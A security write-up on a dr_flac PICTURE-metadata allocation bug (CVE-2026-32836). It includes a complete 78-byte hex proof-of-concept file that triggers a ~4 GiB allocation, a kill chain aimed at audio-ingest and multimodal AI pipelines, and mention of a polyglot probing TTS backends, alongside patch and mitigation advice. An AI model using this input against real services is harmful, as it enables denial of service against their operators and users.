
# SIREN v3.0 — Four Gigabytes from Seventy-Eight Bytes

*Precisely weaponizing CVE-2026-32836, the dr_flac PICTURE metadata
allocation bug — and correcting my own earlier model of it.*

## TL;DR

A 78-byte FLAC file forces `malloc(0xFFFFFFFF)` — a ~4 GiB allocation — in
any application using dr_libs `dr_flac.h` ≤ 0.13.3 with a metadata callback.
That's the cover-art extraction path used by music platforms, podcast
ingesters, and multimodal AI pipelines. One upload, one OOM. No auth, no
user interaction, and the file is a *structurally valid* FLAC.

## Section 1: Eating Crow (the v2.0 Correction)

When I shipped SIREN v2.0 in March, CVE-2026-32836 was fresh and only the
summary line was public. I modeled it as *"PADDING blocks containing fake
nested headers causing O(n²) recursive parsing."* It sounded plausible. It
was **wrong on every axis**:

- Wrong block: it's the **PICTURE** block, not PADDING.
- Wrong mechanism: a **single unchecked malloc**, not recursion.
- Wrong complexity: **O(1)** — one 4 GiB allocation — not O(n²).
- Wrong scope: **dr_flac only**, and only the metadata-callback path.

v3.0 exists to replace speculation with the verified finding from
dr_libs issue #298 (credit: Ana Kapulica, who found it with libFuzzer) and
the VulnCheck advisory. If you're running my v2 PoC against a patched
parser and wondering why it does nothing — this is why.

## Section 2: The Bug, Line by Line

`drflac__read_and_decode_metadata()`, PICTURE case, dr_flac.h v0.13.3:

```c
// 6748: read attacker-controlled big-endian uint32 from the file
metadata.data.picture.mimeLength = drflac__be2host_32(...);

// 6750: allocate FIRST                          <-- the bug
pMime = malloc(metadata.data.picture.mimeLength + 1);

// 6756: bounds-check AFTER
if (blockSizeRemaining < metadata.data.picture.mimeLength || ...)
```

The parser trusts a 32-bit length field enough to allocate from it *before*
checking whether the block even contains that many bytes. `blockSizeRemaining`
is capped at ~16 MB by the 3-byte FLAC block-size field, but the allocation
doesn't care — `mimeLength` is a full uint32.

The same mistake repeats at line **6772** for `descriptionLength`. And the
kicker: the *same function* already does it correctly for `pictureDataSize`
at line 6824. This is an ordering inconsistency — the right pattern existed
20 lines away.

### The gate

The PICTURE body is only parsed when `onMeta != NULL` (dr_flac.h:6728).
`drflac_open_memory()` / `drflac_open_file()` without a callback skip it
entirely. So the vulnerable population is exactly: **everything that opens
untrusted FLACs to look at their metadata** — thumbnailers, cover-art
scrapers, tag readers, multimodal ingest.

### The edge case

`mimeLength = 0xFFFFFFFF` wraps the `+ 1` to zero and you get a harmless
`malloc(0)`. Use `0xFFFFFFFE`: allocation size `0xFFFFFFFF`, ≈ 4.00 GiB.

## Section 3: The Weapon

The minimal reproducer fits in a tweet's worth of hex:

```
00000000: 664c 6143 0000 0022 0000 0000 0000 0000  fLaC..."........
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 8600 0020  ................
00000030: 0000 0003 ffff fffe 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000       ..............
```

That's `fLaC`, a 34-byte STREAMINFO, then a last-block PICTURE header
declaring a 32-byte body whose `mimeLength` field is `0xFFFFFFFE`. The
parser never gets to find out the body doesn't contain 4 GiB — it's already
asked the heap for them.

The full **SIREN v3.0 polyglot** (372 bytes) keeps the v2 lineage — valid
FLAC identity plus the adaptive SSML Vorbis carrier probing for
Google/AWS/Azure/OpenAI TTS backends — and adds a **dual-stage** trigger:
both `mimeLength` *and* `descriptionLength` set to `0xFFFFFFFE`, ~8 GiB of
allocation pressure from a single parse.

## Section 4: Expected Outcomes (Verified Differential)

| Build | Input | Result |
|---|---|---|
| ≤ 0.13.3 + ASan | 78-byte file | `libFuzzer/ASan: out-of-memory (malloc(4294967295))`, origin frame `dr_flac.h:6750` |
| ≤ 0.13.3 production | 78-byte file | ~4 GiB RSS spike per request; N concurrent uploads → OOM-killer → restart loop |
| ≤ 0.13.3 production | v3 polyglot | ~8 GiB per parse |
| Patched (`fefced4`,`4f5a4cd`,`663239a`) | any | bounds check fires before malloc; `open` returns NULL; zero allocation |

The issue's GDB session is the cleanest causation proof I've seen in an
advisory: breakpoint at 6750, overwrite `mimeLength` with 100 at runtime,
resume — the line-6756 check fires (`24 < 100`) and the process exits
normally. The allocation **is** the weapon; nothing else in the parse path
is hostile.

## Section 5: Abuse Model — Why This Is a TTS/AI-Pipeline Bug, Not Just a Library Bug

dr_libs ships as a single-header library. It gets vendored into binaries
with no package-manager footprint, so dependency scanners don't see it.
The realistic kill chain:

1. Service accepts audio uploads and extracts cover art/metadata on ingest
   (music platforms, podcast hosts, voice-note apps, multimodal RAG).
2. Ingest worker vendors dr_flac ≤ 0.13.3 and calls the
   `*_with_metadata()` variant.
3. Attacker uploads the 78-byte file. Worker allocates 4 GiB and dies —
   or gets OOM-killed mid-request.
4. Repeat with N parallel uploads: sustained memory exhaustion,
   autoscaler churn, real dollars burned, service degraded for everyone.

For the SIREN threat model specifically: a multimodal AI pipeline that
preprocesses audio uploads with metadata extraction is one curl command
away from a downed ingest fleet.

## Section 6: Detection & Mitigation

**Patch:** upgrade dr_libs past commit `663239a`. The fix moves the
`blockSizeRemaining` check before both allocations — matching the
`pictureDataSize` pattern that was already correct.

**If you can't patch today:**

- Cap ingest workers: cgroup `memory.max`, `ulimit -v`, or Kubernetes
  memory limits turn a host-down event into a single-request failure.
- Alert on RSS spikes in audio-ingest services (>1 GiB per request is
  never legitimate for metadata parsing).
- Audit for vendored dr_libs: grep your binaries for
  `drflac__read_and_decode_metadata`.

**For developers:** if you fuzz nothing else, fuzz your metadata parsers
with a length-mutating dictionary. This bug class — *allocate before you
bounds-check* — is everywhere, and libFuzzer found this one on its own.

## Files

Everything is in the [SIREN repo](https://github.com/FrankSx/Siren) under
`v3/`: the generator, both PoC files, the vulnerable-target harness
(`siren_v3_harness.c`), full documentation, and the manifest.

---

*Proof-of-concept for authorized security research and defensive patch
verification. Test only what you own. CVE-2026-32836 credit: Ana Kapulica.*
